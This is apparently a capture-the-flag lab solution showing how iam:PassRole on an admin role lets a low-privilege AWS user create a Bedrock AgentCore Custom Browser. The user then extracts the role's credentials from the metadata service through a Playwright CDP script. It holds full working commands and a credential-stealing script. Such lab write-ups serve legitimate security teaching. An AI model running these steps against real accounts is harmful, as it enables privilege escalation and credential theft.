# Solution: AgentCore Custom Browser Creation to Admin

The bedrock-006 scenario exploits a privilege escalation path that exists whenever an IAM principal holds `iam:PassRole` on a privileged role and the full set of permissions needed to create and connect to a Bedrock AgentCore Custom Browser. AgentCore Browsers are AWS-managed headless Chrome instances running inside Firecracker MicroVMs -- the same MicroVM runtime that underlies AgentCore Runtimes and Harnesses. Like those sibling resource types, AWS assumes the browser's execution role on its behalf and vends the resulting temporary credentials via the MicroVM Metadata Service (MMDS) at `169.254.169.254`.

The twist that makes browsers distinct is the absence of an `InvokeAgentRuntimeCommand` equivalent. You cannot shell directly into a browser's MicroVM with a single API call. Instead, AWS exposes a Chrome DevTools Protocol (CDP) endpoint, and the path to credentials runs through JavaScript. Playwright's `chromium.connect_over_cdp()` lets you attach to a live browser session from outside and use `page.evaluate()` to execute JavaScript that runs inside the browser's process -- which itself runs inside the MicroVM where MMDS is listening. The one wrinkle: IMDSv2 requires a PUT request to retrieve the session token, but `fetch()` in a browser context is a cross-origin request to a local IP address. Playwright's `context.route()` hook solves this by intercepting the outbound request before it leaves the browser process and rewriting it as a PUT with the required `X-aws-ec2-metadata-token-ttl-seconds` header.

This is the same PassRole attack surface as bedrock-003 (Runtime) and bedrock-005 (Harness), but the credential extraction mechanism is entirely different -- it requires browser automation tooling rather than a CLI command. In practice this lowers detection surface on the network side while raising it on the CDP connection side.

## The Challenge

You start as `pl-prod-bedrock-006-to-admin-starting-user`, an IAM user with a narrow set of permissions. You have `iam:PassRole` on the target admin role and the bedrock-agentcore permissions needed to create a Custom Browser and establish a CDP session against it. You cannot list IAM users, assume roles directly, or take any other privileged action in the account.

Your goal is to obtain temporary credentials for `pl-prod-bedrock-006-to-admin-target-role`, an IAM role with `AdministratorAccess`. That role trusts `bedrock-agentcore.amazonaws.com` as a service principal, which means it can be passed to an AgentCore Custom Browser as its execution role.

Set up your starting credentials:

```bash
export AWS_ACCESS_KEY_ID=<starting_user_access_key_id>
export AWS_SECRET_ACCESS_KEY=<starting_user_secret_access_key>
unset AWS_SESSION_TOKEN

aws sts get-caller-identity
# arn:aws:iam::{account_id}:user/pl-prod-bedrock-006-to-admin-starting-user
```

Confirm you don't have admin access yet:

```bash
aws iam list-users --max-items 1
# AccessDenied
```

Good. No admin access yet.

## Reconnaissance

Use the helpful `iam:ListRoles` permission to find the target role:

```bash
aws iam list-roles \
  --query 'Roles[?contains(RoleName, `bedrock-006`)].{Name:RoleName,Arn:Arn}' \
  --output table
```

You'll find `pl-prod-bedrock-006-to-admin-target-role`. Use `iam:GetRole` to inspect its trust policy:

```bash
aws iam get-role \
  --role-name pl-prod-bedrock-006-to-admin-target-role \
  --query 'Role.AssumeRolePolicyDocument'
```

The trust policy confirms `bedrock-agentcore.amazonaws.com` as a trusted service principal. This is the necessary condition: any IAM principal that holds `iam:PassRole` on this role can provision an AgentCore resource with this role as its execution role. AWS will then assume the role and expose credentials inside the resulting MicroVM.

Capture the account ID and build the target role ARN:

```bash
ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
TARGET_ROLE_ARN="arn:aws:iam::${ACCOUNT_ID}:role/pl-prod-bedrock-006-to-admin-target-role"
TARGET_ROLE_SHORT="pl-prod-bedrock-006-to-admin-target-role"
```

## Exploitation

The attack has four steps: create the Custom Browser with the privileged execution role, wait for READY state, start a browser session to get the CDP WebSocket URL, and then use Playwright to extract MMDS credentials from inside the browser's MicroVM.

### Step 1: Create the Custom Browser with the Privileged Role

Create the browser using your starting user credentials. The `executionRoleArn` is the key: you are passing the target admin role, and `iam:PassRole` is what AWS checks before accepting the call. No container image or model ID is required for a Custom Browser -- just an execution role and a browser name:

```bash
BROWSER_RESPONSE=$(aws bedrock-agentcore-control create-browser \
  --region us-east-1 \
  --name atk_browser_bedrock_006 \
  --execution-role-arn "$TARGET_ROLE_ARN" \
  --network-configuration '{"networkMode":"PUBLIC"}' \
  --output json)

BROWSER_ID=$(echo "$BROWSER_RESPONSE" | jq -r '.browserId')
echo "Browser ID: $BROWSER_ID"
```

AWS provisions a Firecracker MicroVM for the browser and assumes the execution role on its behalf. The temporary credentials for that role begin flowing to MMDS once the MicroVM finishes initializing.

### Step 2: Wait for READY State

Browser initialization takes 2-5 minutes. Poll `GetBrowser` until the status transitions to `READY`:

```bash
while true; do
  STATUS=$(aws bedrock-agentcore-control get-browser \
    --region us-east-1 \
    --browser-id "$BROWSER_ID" \
    --query 'status' --output text)
  echo "Status: $STATUS"
  [ "$STATUS" = "READY" ] && break
  sleep 15
done
```

Once you see `READY`, the Chromium process inside the MicroVM is running and MMDS is serving credentials for the target role.

### Step 3: Start a Session and Obtain the CDP WebSocket URL

Now start a browser session. This returns a WebSocket URL that you'll use to connect over CDP:

```bash
SESSION_RESPONSE=$(aws bedrock-agentcore start-browser-session \
  --region us-east-1 \
  --browser-identifier "$BROWSER_ID" \
  --output json)

WS_URL=$(echo "$SESSION_RESPONSE" | jq -r '.streams.automationStream.streamEndpoint')
echo "WebSocket URL: $WS_URL"
```

The `ConnectBrowserAutomationStream` permission is validated when you establish a CDP connection through this endpoint.

### Step 4: Connect via Playwright and Extract MMDS Credentials

This is where the technique diverges from the Runtime and Harness variants. Playwright's `chromium.connect_over_cdp()` attaches to the live browser session over the WebSocket URL. `page.evaluate()` then executes JavaScript in the browser process, which runs inside the MicroVM where MMDS is available.

The IMDSv2 complication: the MMDS token endpoint requires a PUT request with a `X-aws-ec2-metadata-token-ttl-seconds` header. A plain `fetch()` call in a browser context is treated as a cross-origin request and won't issue a PUT with custom headers without CORS preflight -- and the MicroVM MMDS doesn't serve CORS headers. Playwright's `context.route()` hook intercepts the outbound request before it enters the browser's network stack and rewrites it, which sidesteps this entirely.

Write the extraction script:

```python
# /tmp/extract_bedrock_006_creds.py
import asyncio, json, sys
from playwright.async_api import async_playwright

TARGET_ROLE = sys.argv[1]
WS_URL = sys.argv[2]

async def main():
    async with async_playwright() as p:
        browser = await p.chromium.connect_over_cdp(WS_URL)
        ctx = browser.contexts[0]

        # Intercept MMDS token request and rewrite as PUT with required header
        async def rewrite_mmds_token(route):
            if '/latest/api/token' in route.request.url:
                await route.continue_(
                    method='PUT',
                    headers={
                        **dict(route.request.headers),
                        'X-aws-ec2-metadata-token-ttl-seconds': '60'
                    }
                )
            else:
                await route.continue_()

        await ctx.route('http://169.254.169.254/**', rewrite_mmds_token)
        page = ctx.pages[0] if ctx.pages else await ctx.new_page()

        # Fetch the MMDS token
        token = await page.evaluate(
            'fetch("http://169.254.169.254/latest/api/token").then(r=>r.text())'
        )

        # Fetch credentials using the token
        creds_json = await page.evaluate(
            f'fetch("http://169.254.169.254/latest/meta-data/iam/security-credentials/{TARGET_ROLE}", '
            f'{{headers:{{"X-aws-ec2-metadata-token":"{token}"}}}}).then(r=>r.json())'
        )
        print(json.dumps(creds_json))
        await browser.close()

asyncio.run(main())
```

Run the script to extract credentials:

```bash
CREDS=$(python3 /tmp/extract_bedrock_006_creds.py "$TARGET_ROLE_SHORT" "$WS_URL")
```

The script returns a JSON object containing the temporary credentials for the target role:

```json
{
  "Code": "Success",
  "Type": "AWS-HMAC",
  "AccessKeyId": "ASIA...",
  "SecretAccessKey": "...",
  "Token": "...",
  "Expiration": "..."
}
```

Export the credentials:

```bash
export AWS_ACCESS_KEY_ID=$(echo "$CREDS" | jq -r '.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo "$CREDS" | jq -r '.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo "$CREDS" | jq -r '.Token')
```

## Verification

Confirm you are now operating as the admin role:

```bash
aws sts get-caller-identity --query 'Arn' --output text
# arn:aws:sts::{account_id}:assumed-role/pl-prod-bedrock-006-to-admin-target-role/...
```

Verify administrator access by performing an action your original user could not:

```bash
aws iam list-users --max-items 3 --output table
# Returns a table of IAM users -- you now have full admin access
```

## Capture the Flag

With admin credentials active, read the CTF flag from SSM Parameter Store. `AdministratorAccess` grants `ssm:GetParameter` on all parameters in the account, including the flag at `/pathfinding-labs/flags/bedrock-006-to-admin`. You are using the MMDS-extracted credentials here -- not your original starting user:

```bash
aws ssm get-parameter \
  --name /pathfinding-labs/flags/bedrock-006-to-admin \
  --query 'Parameter.Value' \
  --output text
```

The value printed is your scenario-specific flag. These are the same temporary credentials you extracted from inside the browser's MicroVM -- the `AdministratorAccess` policy attached to the target role grants unrestricted access to SSM Parameter Store, so the `ssm:GetParameter` call succeeds without any additional setup.

## What Happened

You started with a low-privilege IAM user and a targeted set of Bedrock AgentCore permissions. By creating a Custom Browser and passing your chosen privileged role to it -- something `iam:PassRole` explicitly authorizes -- you caused AWS to assume the admin role on behalf of the browser's Firecracker MicroVM. The MicroVM's MMDS endpoint then served those credentials to any JavaScript executing inside the browser process.

The mechanism for extracting those credentials is what makes bedrock-006 unique among the AgentCore family. The Runtime (bedrock-003) and Harness (bedrock-005) variants both use `InvokeAgentRuntimeCommand` to run a curl one-liner inside the MicroVM. Custom Browsers have no equivalent command invocation API -- the intended interface is CDP. That makes the attack slightly more complex to execute (Playwright is required), but it also shifts the attack surface: there is no shell-level command event to watch in CloudTrail, and the JavaScript `fetch()` calls execute entirely within the browser's network context.

The `context.route()` hook is the elegant piece. By registering an intercept in the Playwright browser context before the `fetch()` call, you rewrite the GET to the IMDSv2 token endpoint into a PUT with the required header. This happens in Playwright's routing layer, before the request enters Chromium's network stack, so the browser never sees a method mismatch and MMDS receives a valid IMDSv2 token request.

In real environments this pattern appears wherever teams grant `iam:PassRole` broadly to support agentic AI workflows. The mental model "Custom Browsers are just web scrapers -- they can't escalate privileges" is wrong the moment an execution role with elevated permissions is attached. Any principal that holds PassRole on such a role and can connect to the browser over CDP has a path to those credentials. The bedrock-006 path adds to the growing list of AgentCore resource types -- Runtime, Harness, and now Browser -- where PassRole on a privileged role that trusts `bedrock-agentcore.amazonaws.com` is functionally equivalent to that role being compromised.
